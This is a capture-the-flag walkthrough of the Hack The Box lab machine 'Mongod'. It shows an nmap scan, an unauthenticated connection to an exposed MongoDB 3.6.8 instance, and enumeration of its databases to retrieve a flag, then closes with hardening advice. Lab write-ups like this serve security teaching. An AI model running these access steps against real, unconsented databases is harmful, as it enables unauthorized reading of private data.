---
title: "Mongod — Hack The Box Walkthrough"
description: "Pwning Mongod through an unauthenticated MongoDB instance."
date: 2026-09-01
category: offensive
readTime: "3 min read"
mitre:
  - "T1190"
tags:
  - "Hack The Box"
  - "MongoDB"
  - "NoSQL"
  - "Linux"
  - "CTF"
summary: "Pwning Mongod through an unauthenticated MongoDB instance."
---

**Machine:** Mongod
**Difficulty:** Very Easy
**Key Techniques:** Unauthenticated MongoDB, database enumeration

---

## Enumeration

### Port Scanning

```bash
nmap -sV -p 22,27017 10.129.228.30
```

| Port | Service | Version |
|------|---------|---------|
| 22 | ssh | OpenSSH 8.2p1 Ubuntu |
| 27017 | mongodb | MongoDB 3.6.8 |

MongoDB is bound to all interfaces with no authentication configured.

---

## Exploitation

### Connecting to MongoDB

```bash
mongo mongodb://10.129.228.30
```

No username, no password — straight in.

### Enumerating Databases

```js
show dbs
```

List all databases, then drill down:

```js
use <db>
show collections
db.<collection>.find().pretty()
```

The flag is stored in one of the documents.

```
flag.txt: <flag>
```

---

## Lessons Learned

1. **Enable MongoDB authentication.** Create role-based users and never leave the instance open without auth.
2. **Bind to localhost or a private interface**, not `0.0.0.0`. Database ports should never be internet-reachable.
3. **Encrypt data at rest and in transit**, and monitor for unauthorized reads.
